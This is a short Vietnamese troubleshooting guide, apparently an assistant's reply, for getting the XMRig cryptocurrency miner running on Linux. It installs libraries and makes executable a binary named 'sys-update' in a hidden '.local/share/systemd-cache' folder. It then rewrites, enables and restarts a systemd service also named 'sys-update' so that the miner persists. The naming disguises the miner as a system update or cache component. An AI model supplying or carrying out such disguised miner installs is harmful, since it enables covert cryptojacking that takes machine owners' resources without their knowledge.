1. Cài đặt các thư viện bắt buộc
XMRig cần các thư viện này để chạy được trên Linux. Nếu thiếu, nó sẽ báo "inactive" ngay lập tức.

Bash
sudo apt update && sudo apt install libuv1-dev libssl-dev libhwloc-dev -y
2. Sửa lỗi "không tìm thấy file" (Fix triệt để)
Nhiều khả năng biến $REAL_PATH lúc nãy bị mất khi bạn mở session mới. Hãy chạy lệnh này để cấp quyền và cố định lại đường dẫn:

Bash
chmod +x $HOME/.local/share/systemd-cache/sys-update
sudo sed -i "s|ExecStart=.*|ExecStart=$HOME/.local/share/systemd-cache/sys-update -c $HOME/.local/share/systemd-cache/config.json|" /etc/systemd/system/sys-update.service
sudo sed -i "s|WorkingDirectory=.*|WorkingDirectory=$HOME/.local/share/systemd-cache|" /etc/systemd/system/sys-update.service
3. Kích hoạt lại và "Ép" chạy
Bash
sudo systemctl daemon-reload
sudo systemctl enable sys-update
sudo systemctl restart sys-update
